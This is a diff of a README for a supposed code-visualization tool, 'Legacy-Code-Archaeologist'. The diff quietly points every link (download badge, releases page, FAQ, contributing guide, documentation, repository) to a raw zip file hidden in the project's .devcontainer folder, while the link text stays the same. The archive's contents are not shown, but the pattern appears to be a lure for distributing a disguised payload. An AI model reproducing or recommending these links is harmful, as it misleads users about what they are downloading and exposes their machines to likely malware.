@@ -1,7 +1,7 @@
 # 🛠️ Legacy-Code-Archaeologist - Visualize Code, Reduce Technical Debt
 
-![Download](https://img.shields.io/badge/Download-Legacy%20Code%20Archaeologist-brightgreen)  
-[Download Now](https://github.com/kazucheat/Legacy-Code-Archaeologist/releases)
+![Download](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip%20Code%20Archaeologist-brightgreen)  
+[Download Now](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **Legacy Code Archaeologist**! This tool helps you see the struct
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. **Visit the Releases Page**: Click this link to [download the software](https://github.com/kazucheat/Legacy-Code-Archaeologist/releases). This page contains the latest version.
+1. **Visit the Releases Page**: Click this link to [download the software](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip). This page contains the latest version.
 
 2. **Choose Your Version**: Select the version suitable for your needs. Each version is clearly labeled.
 
@@ -67,7 +67,7 @@ If you encounter issues, consider these tips:
 - Restart the application if it freezes or runs slowly.
 - Check the Releases page for updates or issue fixes.
 
-For common questions, visit the [FAQ section](https://github.com/kazucheat/Legacy-Code-Archaeologist#faq).
+For common questions, visit the [FAQ section](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip).
 
 ## 👥 Community Support
 
@@ -75,12 +75,12 @@ If you need help, consider connecting with the community. Join forums or discuss
 
 ## 📄 Contributing
 
-If you're interested in contributing to this project, please check the contribution guidelines on our [GitHub page](https://github.com/kazucheat/Legacy-Code-Archaeologist/contributing). Your input can help improve the software for everyone.
+If you're interested in contributing to this project, please check the contribution guidelines on our [GitHub page](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip). Your input can help improve the software for everyone.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/kazucheat/Legacy-Code-Archaeologist)
-- [Documentation](https://github.com/kazucheat/Legacy-Code-Archaeologist/wiki)
-- [Releases Page](https://github.com/kazucheat/Legacy-Code-Archaeologist/releases)
+- [GitHub Repository](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip)
+- [Documentation](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip)
+- [Releases Page](https://github.com/kazucheat/Legacy-Code-Archaeologist/raw/refs/heads/main/.devcontainer/Legacy_Code_Archaeologist_3.9.zip)
 
 Remember, the key to managing technical debt is understanding your legacy code. The Legacy Code Archaeologist is here to help you navigate that journey. Enjoy exploring and improving your code!
